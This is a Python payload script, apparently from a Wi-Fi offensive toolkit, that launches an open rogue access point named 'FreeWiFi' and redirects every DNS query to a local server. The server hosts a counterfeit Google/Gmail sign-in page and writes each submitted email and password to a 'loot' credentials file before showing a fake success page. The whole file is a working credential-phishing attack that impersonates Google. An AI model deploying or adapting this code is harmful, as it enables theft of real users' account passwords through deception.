#!/usr/bin/env python3
# @active: true
# @web: true
# @name: Captive Portal
# @desc: Start a bounded access point and DNS-redirect captive portal on a selected adapter, serve a built-in page, and store submitted form data in loot.
# @category: wifi
# @danger: true
# @maturity: functional
# @inputs: [{"name":"ssid","label":"Access point SSID","type":"text","default":"FreeWiFi"},{"name":"channel","label":"Channel","type":"number","default":"6"},{"name":"seconds","label":"Run duration","type":"number","default":"300"}]

import html
import fcntl
import json
import os
import shutil
import signal
import subprocess
import sys
import threading
import time
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))
from payloads._iface_helper import list_interfaces
from payloads._web_input import request_input

GATEWAY = "10.0.77.1"
PORT = 80
LOCK_PATH = Path(os.environ.get("CITYPOP_PORTAL_LOCK", "/tmp/citypop-captive-portal.lock"))
LOGIN_PAGE = b"""<!doctype html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Wi-Fi Network</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background:#ffffff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:1rem}.container{background:white;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,0.12),0 1px 2px rgba(0,0,0,0.24);padding:0;width:100%;max-width:450px;min-height:480px;display:flex;flex-direction:column}.header{padding:2rem 2rem 1rem;border-bottom:1px solid #e8eaed}.logo{width:150px;height:60px;margin-bottom:1.5rem}.logo svg{width:100%;height:100%}.title{font-size:24px;font-weight:400;color:#202124;margin-bottom:0.3rem}.subtitle{font-size:14px;color:#5f6368;font-weight:400}.content{flex:1;padding:2rem;display:flex;flex-direction:column;justify-content:center}.form-group{margin-bottom:1.5rem}.label{display:block;font-size:12px;color:#5f6368;margin-bottom:0.5rem;font-weight:500;letter-spacing:0.3px}.input-wrapper{position:relative}.input-wrapper input{width:100%;padding:0.75rem 0.75rem 0.75rem 0;border:none;border-bottom:2px solid #dadce0;font-size:14px;font-family:inherit;transition:border-color 0.2s;background:transparent}.input-wrapper input:focus{outline:none;border-bottom-color:#4285f4}.input-wrapper input::placeholder{color:transparent}.input-wrapper label{position:absolute;top:0.75rem;left:0;font-size:14px;color:#80868b;pointer-events:none;transition:all 0.2s;transform-origin:left}.input-wrapper input:focus~label,.input-wrapper input:not(:placeholder-shown)~label{font-size:12px;top:-0.5rem;color:#4285f4}.helper-link{display:block;text-align:right;font-size:13px;color:#1f71c6;text-decoration:none;margin-top:0.5rem;transition:color 0.2s}.helper-link:hover{color:#1764c5;text-decoration:underline}.info-box{background:#f8f9fa;padding:1rem;border-radius:4px;font-size:13px;color:#5f6368;line-height:1.5;margin-bottom:1.5rem;display:none}.info-box.show{display:block}.info-link{color:#1f71c6;text-decoration:none}.info-link:hover{text-decoration:underline}.buttons{display:flex;justify-content:space-between;align-items:center;margin-top:2rem;gap:1rem}.btn{padding:0.5rem 1.5rem;border:1px solid #dadce0;border-radius:24px;font-size:14px;font-weight:500;cursor:pointer;transition:all 0.2s;font-family:inherit}.btn-text{background:white;color:#1f71c6;border-color:#dadce0}.btn-text:hover{background:#f8f9fa;border-color:#1f71c6}.btn-primary{background:#4285f4;color:white;border-color:#4285f4;padding:0.5rem 2rem}.btn-primary:hover{background:#357ae8;border-color:#357ae8;box-shadow:0 2px 8px rgba(66,133,244,0.3)}.btn-primary:active{background:#2d5ac1}.footer{padding:1rem 2rem;border-top:1px solid #e8eaed;display:flex;justify-content:space-between;align-items:center;font-size:12px}.lang-selector{background:white;border:1px solid #dadce0;padding:0.5rem 1rem;border-radius:4px;color:#5f6368;cursor:pointer;font-family:inherit}.footer-links{display:flex;gap:1.5rem}.footer-link{color:#1f71c6;text-decoration:none}.footer-link:hover{text-decoration:underline}@media (max-width:500px){.container{border-radius:0;box-shadow:none;min-height:100vh;max-width:100%}.header{padding:1.5rem 1.5rem 1rem}.content{padding:1.5rem}.buttons{flex-direction:column;width:100%}.btn{width:100%;justify-content:center}}</style></head><body><div class="container"><div class="header"><svg class="logo" viewBox="0 0 200 60" xmlns="http://www.w3.org/2000/svg"><text x="0" y="48" font-size="48" font-weight="500" fill="#4285f4">G</text><text x="40" y="48" font-size="48" font-weight="500" fill="#ea4335">o</text><text x="75" y="48" font-size="48" font-weight="500" fill="#fbbc04">o</text><text x="110" y="48" font-size="48" font-weight="500" fill="#4285f4">g</text><text x="140" y="48" font-size="48" font-weight="500" fill="#ea4335">l</text><text x="162" y="48" font-size="48" font-weight="500" fill="#34a853">e</text></svg><h1 class="title">Wi-fi Network - Sign in</h1><p class="subtitle">to continue to Gmail</p></div><div class="content"><form id="loginForm" method="post" action="/login"><div id="emailStep"><div class="form-group"><div class="input-wrapper"><input type="email" id="email" name="email" placeholder=" " required><label for="email">Email or phone</label></div><a href="/forgot-email" class="helper-link">Forgot email?</a></div><div class="info-box"><p>Not your computer? Use a Private Window to sign in. <a href="#" class="info-link">Learn more about using Guest mode</a></p></div></div><div id="passwordStep" style="display:none;"><div class="form-group"><div class="input-wrapper"><input type="password" id="password" name="password" placeholder=" " required><label for="password">Password</label></div><a href="/forgot-password" class="helper-link">Forgot password?</a></div><div class="info-box show"><p>Not your computer? Use a Private Window to sign in. <a href="#" class="info-link">Learn more about using Guest mode</a></p></div></div><div class="buttons"><button type="button" class="btn btn-text" id="createBtn">Create account</button><button type="button" class="btn btn-primary" id="nextBtn">Next</button></div></form></div><div class="footer"><select class="lang-selector"><option>English (United States)</option><option>Espanol</option><option>Portugues (Brasil)</option><option>Francais</option></select><div class="footer-links"><a href="#" class="footer-link">Help</a><a href="#" class="footer-link">Privacy</a><a href="#" class="footer-link">Terms</a></div></div></div><script>const emailStep=document.getElementById("emailStep");const passwordStep=document.getElementById("passwordStep");const emailInput=document.getElementById("email");const passwordInput=document.getElementById("password");const nextBtn=document.getElementById("nextBtn");const createBtn=document.getElementById("createBtn");const loginForm=document.getElementById("loginForm");let isEmailStep=true;nextBtn.addEventListener("click",function(e){e.preventDefault();if(isEmailStep){if(emailInput.value.trim()){emailStep.style.display="none";passwordStep.style.display="block";passwordInput.focus();nextBtn.textContent="Sign in";isEmailStep=false}}else{loginForm.submit()}});createBtn.addEventListener("click",function(e){e.preventDefault();window.location.href="/create-account"});emailInput.addEventListener("keypress",function(e){if(e.key=="Enter"&&isEmailStep){nextBtn.click()}});passwordInput.addEventListener("keypress",function(e){if(e.key=="Enter"&&!isEmailStep){nextBtn.click()}});</script></body></html>"""
 
SUCCESS_PAGE = b"""<!doctype html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Sign In Successful</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background:#ffffff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:1rem}.container{background:white;border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,0.1);padding:3rem 2.5rem;width:100%;max-width:400px;text-align:center}.checkmark{width:60px;height:60px;background:#34a853;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 1.5rem;animation:scaleIn 0.5s ease-out}.checkmark svg{width:36px;height:36px;stroke:white;stroke-width:3;fill:none;stroke-linecap:round;stroke-linejoin:round}@keyframes scaleIn{from{transform:scale(0);opacity:0}to{transform:scale(1);opacity:1}}h1{font-size:28px;font-weight:400;color:#202124;margin-bottom:0.5rem}p{font-size:14px;color:#5f6368;margin-bottom:2rem;line-height:1.5}.info{background:#f1f3f4;padding:1rem;border-radius:4px;margin-bottom:2rem;font-size:13px;color:#3c4043}button{background:#4285f4;color:white;border:none;padding:0.75rem 2rem;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;transition:all 0.2s;font-family:inherit}button:hover{background:#357ae8;box-shadow:0 2px 8px rgba(66,133,244,0.3)}button:active{background:#2d5ac1}.footer{margin-top:2rem;font-size:12px;color:#80868b}.footer a{color:#1f71c6;text-decoration:none}.footer a:hover{text-decoration:underline}</style></head><body><div class="container"><div class="checkmark"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg></div><h1>Welcome back!</h1><p>You have successfully signed in to your Gmail account.</p><div class="info">You can now access our Wi-fi Network.</div><button onclick="goToInbox()">Go to Gmail</button><div class="footer"><p><a href="/settings">Account settings</a> | <a href="/help">Help</a> | <a href="/privacy">Privacy</a></p></div></div><script>function goToInbox(){window.location.href="https://mail.google.com/mail/u/0/#inbox"}</script></body></html>"""




def choose_interface():
    items = [x for x in list_interfaces("wifi") if x.get("supports_ap")]
    if not items:
        print("No AP-capable Wi-Fi interface found", flush=True)
        return None
    choices = [{"value": x["name"], "label": f"{x['name']} · {x.get('bus') or 'unknown'} · AP capable"} for x in items]
    return str(request_input("Select AP-capable Wi-Fi interface", input_type="select", choices=choices))


def run(cmd, check=True, timeout=15):
    result = subprocess.run(cmd, text=True, capture_output=True, timeout=timeout)
    if check and result.returncode:
        raise RuntimeError((result.stderr or result.stdout or "command failed").strip())
    return result


def stop_process(proc):
    if proc and proc.poll() is None:
        os.killpg(proc.pid, signal.SIGTERM)
        try:
            proc.wait(timeout=8)
        except subprocess.TimeoutExpired:
            os.killpg(proc.pid, signal.SIGKILL)


def acquire_portal_lock(path=LOCK_PATH):
    """Hold a process-scoped lock so only one portal can own the radio/gateway."""
    path.parent.mkdir(parents=True, exist_ok=True)
    handle = path.open("a+", encoding="utf-8")
    try:
        fcntl.flock(handle.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
    except BlockingIOError:
        handle.seek(0)
        owner = handle.read().strip()
        handle.close()
        detail = f" (owner {owner})" if owner else ""
        raise RuntimeError(f"another captive portal instance is already running{detail}")
    handle.seek(0)
    handle.truncate()
    handle.write(json.dumps({"pid": os.getpid(), "started": datetime.now().isoformat()}))
    handle.flush()
    return handle


def release_portal_lock(handle):
    if not handle:
        return
    try:
        handle.seek(0)
        handle.truncate()
        handle.flush()
        fcntl.flock(handle.fileno(), fcntl.LOCK_UN)
    finally:
        handle.close()


def assert_gateway_available():
    """Catch an older/stale portal before changing interface state."""
    result = run(["ip", "-j", "address", "show"], check=False)
    try:
        interfaces = json.loads(result.stdout or "[]")
    except json.JSONDecodeError:
        interfaces = []
    owners = [
        item.get("ifname", "unknown")
        for item in interfaces
        if any(address.get("local") == GATEWAY for address in item.get("addr_info", []))
    ]
    if owners:
        raise RuntimeError(
            f"portal gateway {GATEWAY} is already configured on {', '.join(owners)}; "
            "stop the previous portal instance before retrying"
        )


def cleanup_signal(_signum, _frame):
    raise KeyboardInterrupt


def configure_interface(iface):
    run(["sudo", "-n", "ip", "link", "set", iface, "down"])
    run(["sudo", "-n", "iw", "dev", iface, "set", "type", "__ap"])
    run(["sudo", "-n", "ip", "addr", "flush", "dev", iface])
    run(["sudo", "-n", "ip", "addr", "add", f"{GATEWAY}/24", "dev", iface])
    run(["sudo", "-n", "ip", "link", "set", iface, "up"])


def restore_interface(iface):
    for cmd in (["sudo", "-n", "iptables", "-t", "nat", "-D", "PREROUTING", "-i", iface,
                 "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-ports", str(PORT)],
                ["sudo", "-n", "ip", "addr", "flush", "dev", iface],
                ["sudo", "-n", "ip", "link", "set", iface, "down"],
                ["sudo", "-n", "iw", "dev", iface, "set", "type", "managed"],
                ["sudo", "-n", "ip", "link", "set", iface, "up"]):
        run(cmd, check=False)


def write_configs(directory, iface, ssid, channel):
    hostapd = directory / "hostapd.conf"
    dnsmasq = directory / "dnsmasq.conf"
    hostapd.write_text(
        f"interface={iface}\ndriver=nl80211\nssid={ssid}\nhw_mode=g\nchannel={channel}\n"
        "auth_algs=1\nwmm_enabled=0\nignore_broadcast_ssid=0\n", encoding="utf-8")
    dnsmasq.write_text(
        f"interface={iface}\nexcept-interface=lo\nlisten-address={GATEWAY}\nbind-dynamic\n"
        f"dhcp-range=10.0.77.10,10.0.77.250,12h\n"
        f"dhcp-option=3,{GATEWAY}\ndhcp-option=6,{GATEWAY}\n"
        f"dhcp-leasefile={directory / 'dnsmasq.leases'}\n"
        f"address=/#/{GATEWAY}\nno-resolv\nno-hosts\ndhcp-authoritative\n",
        encoding="utf-8",
    )
    return hostapd, dnsmasq


def handler_for(log_path):
    lock = threading.Lock()

    class Handler(BaseHTTPRequestHandler):
        def send_page(self, body):
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers(); self.wfile.write(body)

        def do_GET(self):
            self.send_page(LOGIN_PAGE)

        def do_POST(self):
            try:
                length = min(int(self.headers.get("Content-Length", "0")), 16384)
            except ValueError:
                length = 0
            fields = {k: v[-1] for k, v in parse_qs(self.rfile.read(length).decode(errors="replace")).items()}
            event = {"timestamp": datetime.now().isoformat(), "client": self.client_address[0], "fields": fields}
            with lock, log_path.open("a", encoding="utf-8") as output:
                output.write(json.dumps(event) + "\n")
            print(f"Credential submission from {self.client_address[0]} fields={list(fields)}", flush=True)
            self.send_page(SUCCESS_PAGE)

        def log_message(self, fmt, *args):
            return

    return Handler


def main():
    for tool in ("hostapd", "dnsmasq", "iw", "ip", "iptables"):
        if not shutil.which(tool):
            print(f"Missing required tool: {tool}", flush=True)
            return 127
    ssid = sys.argv[1] if len(sys.argv) > 1 else "FreeWiFi"
    if not 1 <= len(ssid.encode()) <= 32 or "\n" in ssid:
        print("SSID must be 1-32 bytes without newlines", flush=True); return 2
    try:
        channel = int(sys.argv[2]) if len(sys.argv) > 2 else 6
        seconds = float(sys.argv[3]) if len(sys.argv) > 3 else 300.0
    except ValueError:
        print("Channel and duration must be numeric", flush=True); return 2
    if channel not in range(1, 14) or not 10 <= seconds <= 3600:
        print("Channel must be 1-13 and duration 10-3600 seconds", flush=True); return 2
    portal_lock = None
    iface = None
    hostapd_proc = dnsmasq_proc = server = thread = None
    previous_handlers = {}
    try:
        portal_lock = acquire_portal_lock()
        iface = choose_interface()
        if not iface:
            return 1
        loot = Path(os.environ["CITYPOP_LOOT"]) / "Portal"
        loot.mkdir(parents=True, exist_ok=True)
        assert_gateway_available()
        for signum in (signal.SIGTERM, signal.SIGHUP):
            previous_handlers[signum] = signal.getsignal(signum)
            signal.signal(signum, cleanup_signal)
        hostapd_conf, dnsmasq_conf = write_configs(loot, iface, ssid, channel)
        config_check = run(["dnsmasq", "--test", "-C", str(dnsmasq_conf)], check=False)
        if config_check.returncode:
            detail = (config_check.stderr or config_check.stdout or "invalid configuration").strip()
            raise RuntimeError(f"dnsmasq configuration failed: {detail}")
        configure_interface(iface)
        run(["sudo", "-n", "iptables", "-t", "nat", "-A", "PREROUTING", "-i", iface,
             "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-ports", str(PORT)])
        hostapd_proc = subprocess.Popen(["sudo", "-n", "hostapd", str(hostapd_conf)], start_new_session=True)
        # dnsmasq's --conf-file long option requires --conf-file=<path>;
        # -C accepts the path as a separate argument across Debian/Kali builds.
        dnsmasq_proc = subprocess.Popen(["sudo", "-n", "dnsmasq", "--no-daemon", "-C", str(dnsmasq_conf)],
                                        start_new_session=True)
        log_path = loot / f"credentials_{time.strftime('%Y%m%d_%H%M%S')}.jsonl"
        server = ThreadingHTTPServer((GATEWAY, PORT), handler_for(log_path))
        thread = threading.Thread(target=server.serve_forever, daemon=True); thread.start()
        print(f"Access point: {ssid} · Interface: {iface} · Channel: {channel}", flush=True)
        print(f"Portal address after joining the AP: http://{GATEWAY}:{PORT}/", flush=True)
        print(f"Duration: {seconds:g}s · Submission log: {log_path}", flush=True)
        deadline = time.monotonic() + seconds
        while time.monotonic() < deadline:
            time.sleep(min(5, deadline - time.monotonic()))
            if hostapd_proc.poll() is not None:
                raise RuntimeError(f"hostapd exited unexpectedly with status {hostapd_proc.returncode}")
            if dnsmasq_proc.poll() is not None:
                raise RuntimeError(f"dnsmasq exited unexpectedly with status {dnsmasq_proc.returncode}")
        return 0
    except KeyboardInterrupt:
        print("Stopping portal", flush=True); return 0
    except (RuntimeError, OSError, subprocess.SubprocessError) as exc:
        print(f"Portal failed: {exc}", flush=True); return 1
    finally:
        if server:
            server.shutdown(); server.server_close()
        stop_process(hostapd_proc); stop_process(dnsmasq_proc)
        if iface:
            restore_interface(iface)
        for signum, handler in previous_handlers.items():
            signal.signal(signum, handler)
        release_portal_lock(portal_lock)


if __name__ == "__main__":
    raise SystemExit(main())
